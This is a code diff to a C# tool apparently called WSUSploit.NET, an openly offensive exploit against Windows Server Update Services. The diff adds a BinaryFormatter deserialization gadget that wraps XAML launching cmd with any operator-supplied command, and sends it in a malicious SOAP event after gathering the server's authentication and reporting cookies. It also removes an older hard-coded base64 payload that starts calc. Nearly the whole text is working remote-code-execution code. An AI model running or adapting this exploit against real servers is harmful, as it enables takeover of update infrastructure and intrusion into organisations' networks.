@@ -3,15 +3,26 @@ using System.Text;
 using System.Net.Http;
 using System.Xml.Linq;
 using System.Security;
+using System.Windows.Data;
 using WSUSploit.NET;
+using System.Diagnostics;
+using System.IO;
+using System.Xml;
+using System.Windows.Markup;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Windows;
+using System.Collections.Specialized;
+using System.Reflection;
+using System.Runtime.Serialization;
 
-if (args.Length == 0)
+if (args.Length < 2)
 {
-    Console.WriteLine("Usage: WSUSploit.NET <URL>");
+    Console.WriteLine("Usage: WSUSploit.NET <URL> <CMD>");
     return;
 }
 
 Uri serverUri = new Uri(args[0]);
+string cmd = args[1];
 
 Console.WriteLine($"[*] Running against {serverUri}");
 
@@ -19,12 +30,74 @@ WSUSServer server = new WSUSServer(serverUri);
 await server.GetServerId();
 await server.GetAuthCookie();
 await server.GetReportingCookie();
-await server.SendMaliciousEvent();
+
+string payload = new Sploit().Create(cmd); 
+await server.SendMaliciousEvent(payload);
 
 
 
 namespace WSUSploit.NET
 {
+
+
+    [Serializable]
+    public class TextFormattingRunPropertiesMock : ISerializable
+    {
+        public object ForegroundBrush { get; set; }
+
+        public TextFormattingRunPropertiesMock() { }
+
+        protected TextFormattingRunPropertiesMock(SerializationInfo info, StreamingContext context)
+        {
+            ForegroundBrush = info.GetValue("ForegroundBrush", typeof(object));
+        }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            // Set the exact type information to match your target
+            info.SetType(typeof(TextFormattingRunPropertiesMock));
+            info.AssemblyName = "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
+            info.FullTypeName = "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties";
+            info.AddValue("ForegroundBrush", ForegroundBrush);
+        }
+    }
+    class Sploit
+    {
+        public Sploit() { } 
+
+        public string Create(string command)
+        {
+
+            // Build XAML string
+            string xaml = $@"<ObjectDataProvider MethodName=""Start"" IsInitialLoadEnabled=""False"" xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:sd=""clr-namespace:System.Diagnostics;assembly=System"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"">
+  <ObjectDataProvider.ObjectInstance>
+    <sd:Process>
+      <sd:Process.StartInfo>
+        <sd:ProcessStartInfo Arguments=""/c {SecurityElement.Escape(command)}"" StandardErrorEncoding=""{{x:Null}}"" StandardOutputEncoding=""{{x:Null}}"" UserName="""" Password=""{{x:Null}}"" Domain="""" LoadUserProfile=""False"" FileName=""cmd"" />
+      </sd:Process.StartInfo>
+    </sd:Process>
+  </ObjectDataProvider.ObjectInstance>
+</ObjectDataProvider>";
+
+            var wrapper = new TextFormattingRunPropertiesMock { ForegroundBrush = xaml };
+
+
+            // Serialize with BinaryFormatter
+#pragma warning disable SYSLIB0011
+            BinaryFormatter formatter = new BinaryFormatter();
+#pragma warning restore SYSLIB0011
+
+            using (MemoryStream ms = new MemoryStream())
+            {
+                formatter.Serialize(ms, wrapper);
+                byte[] payload = ms.ToArray();
+                string b64Payload = Convert.ToBase64String(payload);
+                Console.WriteLine("[*] Final payload: " + b64Payload);
+                return b64Payload;
+            }
+        }
+    }
+
     class WSUSServer
     {
         public string ServerId { get; set; } = "";
@@ -200,14 +273,13 @@ namespace WSUSploit.NET
 
         }
 
-        public async Task SendMaliciousEvent()
+        public async Task SendMaliciousEvent(string b64Payload)
         {
             Console.WriteLine("[*] Sending malicious event...");
 
             string targetSid = Guid.NewGuid().ToString();
             string eventInstanceId = Guid.NewGuid().ToString();
             string timeNow = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fff");
-            string b64Payload = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==";
             string payloadEnvelope = $@"<SOAP-ENV:Envelope
 	            xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
 	            xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
